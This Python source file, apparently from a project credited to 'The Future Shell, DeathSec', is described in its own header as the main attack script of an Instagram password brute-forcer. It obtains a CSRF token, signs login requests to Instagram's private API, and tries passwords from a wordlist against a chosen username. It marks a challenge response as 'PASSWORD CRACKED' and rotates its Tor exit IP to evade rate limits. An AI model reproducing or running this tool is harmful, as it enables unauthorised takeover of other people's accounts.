# Intagram-py , Copyright (C) 2017 The Future Shell , DeathSec
# filename : instagram_bot.py
# The main attack script used to get csrftoken and check if a password is okay!

import requests
import uuid
import hmac
import urllib
import hashlib
import json
from time import sleep
from stem import Signal # to control tor server
from stem.control import Controller
from .colors import Fore , Back , Style , init
from .getterminal import get_terminal_size
from .logger import log_result
from .progress import print_progress
from .constants import app_error

init(autoreset=True) # set to automatically reset colors!

def _writeSave(session_config , current_line):
    savefile = open(session_config['checkpoint'] , 'w')
    savefile.write(
    '{ "username" : "'+ session_config['username']+
    '" , "passwordFile" : "'+ session_config['passwordFile']+
    '" ,"line-count" : "'+ str(current_line)+
    '"}'
    )
    savefile.close()

def get_magic_cookie(session_config):
    session_config['bot'].get(
        session_config['config']['api-url'] + "si/fetch_headers/?challenge_type=signup&guid=" +
        str(uuid.uuid4()).replace('-' , '')
    );
    return session_config['bot'].cookies['csrftoken']; # this is the magic cookie


def InjectPassword(session_config , current_line):
    session_config['progress_status'] = ' [*] Trying... ' + session_config['password']
    sizex , sizey = get_terminal_size() # get terminal size
    ptotal = int(sizex/3) # to shrink the progress bar!
    print_progress(int(int(current_line/int(session_config['password_file_length'])*100)/100*ptotal) , ptotal  , session_config)
    user_hash = hashlib.md5()
    user_hash.update(session_config['username'].encode('utf-8') + session_config['password'].encode('utf-8'));
    device_hash = hashlib.md5()
    device_hash.update(user_hash.hexdigest().encode('utf-8') + '12345'.encode('utf-8'))
    data = {
        'phone_id'   : str(uuid.uuid4()),
        '_csrftoken' : session_config['magic_cookie'],
        'username'   : session_config['username'],
        'guid'       : str(uuid.uuid4()),
        'device_id'  : str('android-' + device_hash.hexdigest()[:16]),
        'password'   : session_config['password'],
        'login_attempt_count' : '0'
    }
    r = session_config['bot'].post(
            session_config['config']['api-url'] + 'accounts/login/' , 
            data=str('ig_sig_key_version='+ session_config['config']['ig-sig-version'] + '&signed_body=' + 
            hmac.new(session_config['config']['ig-sig-key'].encode('utf-8'), 
            json.dumps(data).encode('utf-8'), 
            hashlib.sha256).hexdigest() + 
            '.' + urllib.parse.quote(json.dumps(data)))
    )
    if(r.status_code == 200):
        session_config['progress_status'] = ' [+] PASSWORD CRACKED '
        print_progress(ptotal,ptotal , session_config )
        print('\n')
        log_result(session_config)
    else:
        message = json.loads(r.content);
        if message['message'] == 'challenge_required':
            session_config['progress_status'] = ' [+] PASSWORD CRACKED '
            print_progress(ptotal,ptotal , session_config )
            print('\n')
            log_result(session_config)
        elif message['message'] == 'The password you entered is incorrect. Please try again.':
            # write to save file for later use!
            _writeSave(session_config , current_line)
            # the password is confirmed to be wrong so pass on!
            session_config['proceedWith'] = True
        else:
            if 'Invalid' not in message['message']:
                session_config['progress_status'] = ' [*] changing ip... '
                print_progress(int(int(current_line/int(session_config['password_file_length'])*100)/100*ptotal),ptotal,session_config)
                session_config['tor_controller'].signal(Signal.NEWNYM) # signal tor to change ip 
                sleep(3) # lets wait to tor! a little!
            else:
                session_config['proceedWith'] = True
